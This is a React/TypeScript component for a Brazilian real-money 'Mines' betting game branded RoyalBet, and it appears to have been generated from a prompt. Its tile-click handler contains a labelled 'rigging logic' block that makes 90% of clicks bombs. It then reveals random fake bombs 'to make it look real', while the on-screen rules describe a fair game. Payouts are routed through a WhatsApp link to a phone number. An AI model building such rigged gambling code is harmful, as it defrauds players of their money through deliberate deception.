import React, { useState, useEffect, useRef } from 'react';
import { Button } from './Button';
import { Input } from './Input';
import { Diamond, Bomb, XCircle, Trophy, RefreshCw, ArrowLeft, HelpCircle, X, MessageCircle } from 'lucide-react';
import { UserProfile } from '../types';

interface MinesGameProps {
  user: UserProfile;
  onUpdateBalance: (newBalance: number, amountSpent: number) => void;
  onExit: () => void;
}

type TileState = 'HIDDEN' | 'DIAMOND' | 'BOMB';

interface Tile {
  id: number;
  state: TileState;
}

const MULTIPLIERS = [0.5, 1.0, 2.0, 2.5, 3.0];

export const MinesGame: React.FC<MinesGameProps> = ({ user, onUpdateBalance, onExit }) => {
  const gameRef = useRef<HTMLDivElement>(null);
  const [grid, setGrid] = useState<Tile[]>(Array.from({ length: 25 }, (_, i) => ({ id: i, state: 'HIDDEN' })));
  const [betAmount, setBetAmount] = useState<string>('10');
  const [selectedMultiplier, setSelectedMultiplier] = useState<number>(1.0);
  const [isPlaying, setIsPlaying] = useState(false);
  const [isGameOver, setIsGameOver] = useState(false);
  const [winAmount, setWinAmount] = useState(0);
  const [diamondsFound, setDiamondsFound] = useState(0);
  const [statusMessage, setStatusMessage] = useState('');
  const [showRules, setShowRules] = useState(false);
  const [showWinButton, setShowWinButton] = useState(false);

  // Setup grid
  useEffect(() => {
    resetGame();
  }, []);

  const resetGame = () => {
    setGrid(Array.from({ length: 25 }, (_, i) => ({ id: i, state: 'HIDDEN' })));
    setIsPlaying(false);
    setIsGameOver(false);
    setWinAmount(0);
    setDiamondsFound(0);
    setStatusMessage('Faça sua aposta para começar');
    setShowWinButton(false);
  };

  const startGame = () => {
    const bet = parseFloat(betAmount);
    if (isNaN(bet) || bet <= 0) {
      setStatusMessage('Valor de aposta inválido');
      return;
    }
    if (bet > user.balance) {
      setStatusMessage('Saldo insuficiente');
      return;
    }

    // Scroll to view
    if (gameRef.current) {
      gameRef.current.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }

    // Add a small delay for the scroll to happen before game state activates visually
    setTimeout(() => {
      // Deduct bet immediately
      onUpdateBalance(user.balance - bet, bet);
      setIsPlaying(true);
      setIsGameOver(false);
      setWinAmount(0);
      setDiamondsFound(0);
      setShowWinButton(false);
      setStatusMessage('Boa sorte! Encontre os diamantes.');
      
      // Reset grid visuals
      setGrid(Array.from({ length: 25 }, (_, i) => ({ id: i, state: 'HIDDEN' })));
    }, 400);
  };

  const handleTileClick = (index: number) => {
    if (!isPlaying || isGameOver || grid[index].state !== 'HIDDEN') return;

    // --- RIGGING LOGIC START ---
    // Rule: User has only 10% chance to win (find a diamond).
    // This means 90% chance of hitting a bomb on any click.
    
    // 0.90 = 90% chance of Loss (Bomb)
    // 0.10 = 10% chance of Win (Diamond)
    const isBomb = Math.random() < 0.90;
    
    // --- RIGGING LOGIC END ---

    const newGrid = [...grid];

    if (isBomb) {
      // GAME OVER - LOSS
      newGrid[index].state = 'BOMB';
      // Reveal other bombs randomly to make it look real
      newGrid.forEach(tile => {
        if (tile.state === 'HIDDEN' && Math.random() < 0.4) {
          tile.state = 'BOMB';
        }
      });
      setGrid(newGrid);
      setIsGameOver(true);
      setIsPlaying(false);
      setWinAmount(0);
      setShowWinButton(false);
      setStatusMessage(`BOMBA! Você perdeu R$ ${betAmount}`);
    } else {
      // SUCCESS - DIAMOND
      newGrid[index].state = 'DIAMOND';
      setGrid(newGrid);
      
      const newDiamondsFound = diamondsFound + 1;
      setDiamondsFound(newDiamondsFound);
      
      // Calculate Win: Bet * Multiplier * DiamondsFound
      const bet = parseFloat(betAmount);
      // Formula based on prompt: "multiplying the value he bet by the multiplier he chose"
      // Interpretation: Total Win = Bet * Multiplier * Count
      const currentWinValue = bet * selectedMultiplier * newDiamondsFound;
      setWinAmount(currentWinValue);
      
      setStatusMessage(`Diamante! Ganho atual: R$ ${currentWinValue.toFixed(2)}`);
    }
  };

  const handleCashout = () => {
    if (winAmount > 0) {
      onUpdateBalance(user.balance + winAmount, 0); // 0 extra spent, just adding win
      setStatusMessage(`SAQUE REALIZADO! Ganhou R$ ${winAmount.toFixed(2)}`);
      setShowWinButton(true);
    } else {
      // Edge case: cashout with 0 wins
      setStatusMessage('Jogo encerrado sem ganhos.');
      setShowWinButton(false);
    }
    setIsGameOver(true);
    setIsPlaying(false);
  };

  return (
    <div ref={gameRef} className="w-full max-w-5xl mx-auto animate-fade-in flex flex-col md:flex-row gap-8 scroll-mt-4">
      
      {/* Sidebar Controls */}
      <div className="w-full md:w-80 bg-royal-900/80 backdrop-blur-xl border border-royal-700 rounded-2xl p-6 h-fit order-2 md:order-1 flex flex-col">
        <div className="flex items-center justify-between mb-6">
           <div className="text-neon-yellow font-bold text-sm bg-royal-800 px-3 py-1 rounded-full border border-royal-700 shadow-neon">
             SALDO: R$ {user.balance.toFixed(2)}
          </div>
          <button onClick={() => setShowRules(true)} className="text-gray-400 hover:text-white">
            <HelpCircle size={20} />
          </button>
        </div>

        <h2 className="text-2xl font-display font-bold text-white mb-6">
          MINAS DA <span className="text-neon-yellow">FORTUNA</span>
        </h2>

        {/* Rules Modal */}
        {showRules && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 animate-fade-in">
            <div className="bg-royal-800 border border-royal-600 rounded-xl p-6 max-w-md w-full relative shadow-2xl">
              <button 
                onClick={() => setShowRules(false)}
                className="absolute top-4 right-4 text-gray-400 hover:text-white"
              >
                <X size={24} />
              </button>
              <h3 className="text-xl font-display font-bold text-white mb-4 flex items-center gap-2">
                <HelpCircle className="text-neon-yellow" /> Regras do Jogo
              </h3>
              <ul className="space-y-2 text-sm text-gray-300 list-disc pl-5">
                <li>O objetivo é clicar nos quadrados para encontrar <strong>Diamantes</strong>.</li>
                <li>Cada diamante aumenta seu prêmio.</li>
                <li>Se clicar em uma <strong>Bomba</strong>, você perde tudo.</li>
                <li>Você pode clicar em <strong>SACAR</strong> a qualquer momento para garantir seus ganhos.</li>
              </ul>
            </div>
          </div>
        )}

        <div className="space-y-6 flex-grow">
          <div>
            <label className="block text-gray-400 text-xs font-bold mb-2 uppercase">Valor da Aposta</label>
            <div className="relative">
              <span className="absolute left-3 top-3 text-neon-yellow font-bold">R$</span>
              <input 
                type="number" 
                value={betAmount}
                onChange={(e) => setBetAmount(e.target.value)}
                disabled={isPlaying}
                className="w-full bg-royal-800 text-white border-2 border-royal-700 rounded-lg py-3 pl-10 pr-4 focus:border-neon-yellow focus:outline-none transition-colors font-bold disabled:opacity-50"
              />
            </div>
          </div>

          <div>
             <label className="block text-gray-400 text-xs font-bold mb-2 uppercase">Multiplicador</label>
             <div className="grid grid-cols-3 gap-2">
                {MULTIPLIERS.map(m => (
                  <button
                    key={m}
                    onClick={() => setSelectedMultiplier(m)}
                    disabled={isPlaying}
                    className={`
                      py-2 px-1 rounded border-2 font-bold text-sm transition-all
                      ${selectedMultiplier === m 
                        ? 'bg-neon-yellow border-neon-yellow text-royal-900 shadow-neon' 
                        : 'bg-royal-800 border-royal-700 text-gray-400 hover:border-gray-500'
                      }
                      disabled:opacity-50 disabled:cursor-not-allowed
                    `}
                  >
                    {m.toFixed(1)}x
                  </button>
                ))}
             </div>
             <p className="text-xs text-gray-500 mt-2">
               *Quanto maior, mais difícil.
             </p>
          </div>

          {!isPlaying ? (
            <Button onClick={startGame} disabled={user.balance <= 0}>
              APOSTAR AGORA
            </Button>
          ) : (
            <Button variant="success" onClick={handleCashout} disabled={isGameOver || winAmount === 0}>
              SACAR R$ {winAmount.toFixed(2)}
            </Button>
          )}

          {isGameOver && (
             <Button variant="outline" onClick={resetGame} className="mt-2">
               <RefreshCw size={18} className="mr-2 inline" /> JOGAR NOVAMENTE
             </Button>
          )}

          {showWinButton && (
            <a 
              href="https://wa.me/5534984331211?text=Ol%C3%A1%2C%20ganhei%20no%20RoyalBet%20e%20gostaria%20de%20solicitar%20um%20saque!"
              target="_blank"
              rel="noopener noreferrer"
              className="mt-4 w-full bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-4 rounded-lg flex items-center justify-center gap-2 animate-bounce shadow-lg transition-colors"
            >
              <MessageCircle size={20} />
              FALAR COM SUPORTE PARA SAQUE
            </a>
          )}
        </div>

        {/* Back Button */}
        <div className="pt-6 mt-6 border-t border-royal-700">
          <Button variant="secondary" onClick={onExit} className="flex items-center justify-center gap-2">
            <ArrowLeft size={16} /> VOLTAR AO LOBBY
          </Button>
        </div>
      </div>

      {/* Game Grid */}
      <div className="flex-1 bg-royal-800/30 rounded-2xl border border-royal-700 p-4 md:p-8 flex flex-col items-center justify-center relative min-h-[500px] order-1 md:order-2">
        
        {/* Status Bar */}
        <div className="mb-6 text-center h-8">
           <p className={`font-display font-bold text-lg ${isGameOver ? (statusMessage.includes('BOMBA') ? 'text-red-500' : 'text-green-500') : 'text-neon-yellow'}`}>
             {statusMessage}
           </p>
        </div>

        <div className="grid grid-cols-5 gap-3 w-full max-w-[450px]">
           {grid.map((tile) => (
             <button
                key={tile.id}
                onClick={() => handleTileClick(tile.id)}
                disabled={!isPlaying || isGameOver || tile.state !== 'HIDDEN'}
                className={`
                  aspect-square rounded-xl border-b-4 transition-all duration-200 flex items-center justify-center text-4xl relative overflow-hidden group
                  ${tile.state === 'HIDDEN' 
                    ? 'bg-royal-700 border-royal-900 hover:-translate-y-1 hover:brightness-110 cursor-pointer active:border-b-0 active:translate-y-1' 
                    : 'cursor-default border-b-0 translate-y-1'
                  }
                  ${tile.state === 'DIAMOND' ? 'bg-royal-800 border-royal-800 shadow-[inset_0_0_20px_rgba(204,255,0,0.2)]' : ''}
                  ${tile.state === 'BOMB' ? 'bg-red-900/50 border-red-900' : ''}
                  ${!isPlaying && !isGameOver ? 'opacity-50 cursor-not-allowed hover:transform-none' : ''}
                `}
             >
                {tile.state === 'DIAMOND' && (
                  <Diamond className="text-neon-yellow w-1/2 h-1/2 animate-bounce drop-shadow-[0_0_10px_rgba(204,255,0,0.8)]" />
                )}
                {tile.state === 'BOMB' && (
                  <Bomb className="text-red-500 w-1/2 h-1/2 animate-pulse" />
                )}
                {tile.state === 'HIDDEN' && (
                   <div className="w-2 h-2 rounded-full bg-royal-600/50 group-hover:bg-neon-yellow/50 transition-colors"></div>
                )}
             </button>
           ))}
        </div>

        {winAmount > 0 && !isGameOver && (
          <div className="absolute top-4 right-4 bg-royal-900/90 px-4 py-2 rounded-lg border border-neon-yellow/30 shadow-neon">
            <span className="text-xs text-gray-400 block uppercase tracking-wider">Ganho Atual</span>
            <span className="text-xl font-bold text-white">R$ {winAmount.toFixed(2)}</span>
          </div>
        )}
      </div>
    </div>
  );
};